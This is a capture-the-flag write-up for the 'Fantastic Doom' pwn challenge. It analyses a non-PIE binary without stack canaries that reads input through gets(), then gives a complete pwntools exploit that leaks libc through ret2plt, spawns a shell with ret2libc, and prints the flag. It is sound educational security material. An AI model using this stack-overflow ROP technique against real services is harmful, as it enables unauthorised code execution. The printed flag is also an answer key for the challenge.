https://ctftime.org/event/2657

# Fantastic Doom (pwn)

Doctor Doom, the monarch of Latveria has made many doombots. You working with the Fantastic 4 have to access doombot machine and foil his plans of releasing doombots.

nc chall.ehax.tech 1925

## Analysis

We can see that the binary was compiled with `-no-pie` and appears to not have stack canaries:

```
$ pwn checksec ./chall
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`main` @ - `0x00400787`:

- `gets(stack_buffer)` offset from retaddr by 0xa8 bytes

## Solution

1) ret2plt to bypass libc's aslr
2) ret2libc

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall", checksec=False)
context.binary = elf

libc = ELF("./libc-2.27.so", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b main")
p = remote("chall.ehax.tech", 4269)

rop = ROP(elf)
rop.raw(b"A" * 0xa8)
rop.puts(elf.got["puts"])
rop.raw(elf.sym["main"])
p.sendline(rop.chain())

p.readuntil(b"Failed Login\n")

leak = u64(p.recv(6) + b"\x00\x00")
libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A" * 0xa8)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.readuntil(b"Failed Login\n")
p.sendline(b"/bin/cat flag.txt")
print(p.readline().decode()[:-1]) # EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}
```

## Flag
`EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}`

smiley 2025/02/16
